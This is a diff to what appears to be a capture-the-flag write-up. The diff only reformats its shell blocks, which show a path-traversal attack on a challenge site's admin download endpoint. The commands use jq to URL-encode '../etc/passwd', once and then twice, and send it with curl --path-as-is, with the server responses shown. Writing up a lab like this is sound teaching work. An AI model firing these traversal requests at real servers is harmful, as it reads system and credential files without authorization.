@@ -191,10 +191,13 @@ form, but will also decode any URL-encoded segments. This means we can't simply
 URL-encode the path to bypass this:
 
 ```html
-~ ❯ echo "../../../../../../../../../../../etc/passwd" | jq -Rr @uri
-..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd ~ ❯ curl -b
-'session=session_cookie' --path-as-is
-https://asteroid.sunshinectf.games/admin/download/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+~ 
+❯ echo "../../../../../../../../../../../etc/passwd" | jq -Rr @uri
+..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd 
+
+~ 
+❯ curl -b 'session=session_cookie' --path-as-is \
+  https://asteroid.sunshinectf.games/admin/download/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
 <html>
   <head>
     <title>400 Bad Request</title>
@@ -212,11 +215,12 @@ off the documentation excerpt though, it seems like NGINX will only decode once.
 So, what if we URL encode our path twice?
 
 ```html
-~ ❯ echo "../../../../../../../../../../../etc/passwd" | jq -Rr @uri | jq -Rr
-@uri
+~
+❯ echo "../../../../../../../../../../../etc/passwd" | jq -Rr @uri | jq -Rr @uri
 ..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd
-~ ❯ curl -b 'session=session_cookie' --path-as-is
-https://asteroid.sunshinectf.games/admin/download/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd
+~
+❯ curl -b 'session=session_cookie' --path-as-is \
+  https://asteroid.sunshinectf.games/admin/download/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd
 <!doctype html>
 <html lang="en">
   <title>Redirecting...</title>
